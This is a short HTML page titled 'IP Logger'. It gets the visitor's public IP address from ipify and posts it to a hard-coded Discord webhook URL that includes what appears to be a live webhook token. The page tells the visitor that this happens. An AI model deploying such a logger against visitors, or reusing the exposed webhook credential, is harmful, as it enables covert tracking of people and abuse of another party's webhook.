<!DOCTYPE html>
<html>
<head>
  <title>IP Logger</title>
  <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
  <script>
    function getIP(response) {
      var ip = response.ip;
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "https://discord.com/api/webhooks/1219974034486333521/cr48AKMgXBw8ELXyhhFvdcBlGItIQm3gYK89gtUAjOwa5Il4bqy_tVaHmJntQwOQ37pj", true);
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.send(JSON.stringify({ content: "IP Logged: " + ip }));
    }
  </script>
</head>
<body>
  <h1>Welcome to the IP Logger</h1>
  <p>Your IP address will be logged and sent to the Discord webhook.</p>
  <p>Please wait a moment...</p>
  <script>getIP()</script>
</body>
</html>
